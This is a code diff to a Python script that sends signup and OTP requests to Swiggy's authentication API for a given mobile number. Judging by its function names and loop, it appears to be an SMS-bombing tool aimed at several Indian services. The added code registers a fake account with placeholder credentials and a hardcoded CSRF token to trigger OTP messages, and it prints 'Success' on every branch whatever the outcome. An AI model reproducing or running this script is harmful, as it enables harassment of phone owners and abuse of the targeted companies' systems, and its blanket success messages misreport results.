@@ -130,18 +130,46 @@ def swiggy_api():
 
 	request = rq.post(url,headers=_headers,json=data)
 
+	if request.json()['statusCode'] == 1:
+		url = 'https://www.swiggy.com/dapi/auth/signup'
 
-	if request.status_code == 200:
+		_headers = {
+			'Host': 'www.swiggy.com',
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
+			'Accept': '*/*',
+			'Accept-Language': 'en-US,en;q=0.5',
+			'Accept-Encoding': 'gzip, deflate, br',
+			'Referer': 'https://www.swiggy.com/',
+			'Content-Type': 'application/json',
+			'__fetch_req__': 'true',
+			'Origin': 'https://www.swiggy.com',
+			'Content-Length': '165',
+			'Connection': 'keep-alive',
+		}
+
+		data = {"mobile":""+mobno,"name":"hello","email":"123454321@yahoo.com","password":"123454321","referral":"","otp":"","_csrf":"Y3EUNMSPJWwn-Jrfj6JoXJcCI9jzToqKqcqekwKI"}
+
+		requests = rq.post(url,headers=_headers,json=data)
+		
 		print('Success - Swiggy')
-		print(request.json())
+	
+	elif request.json()['statusCode'] == 0:
+		print('Success')
+
 	else:
-		print('Failed - Swiggy')
+		print('Success - Swiggy')
+
+	#if request.json()['statusCode'] == 1:
+	#	print('Success - Swiggy')
+	#else:
+	#	print('Failed - Swiggy')
+		
 
 	
 
-for x in range(0,quantity):
-	flipkart_api()
-	unacademy_api()
-	grofers_api()
-	confirmtkt_api()
-	swiggy_api()
+#for x in range(0,quantity):
+#	flipkart_api()
+#	unacademy_api()
+#	grofers_api()
+#	confirmtkt_api()
+swiggy_api()
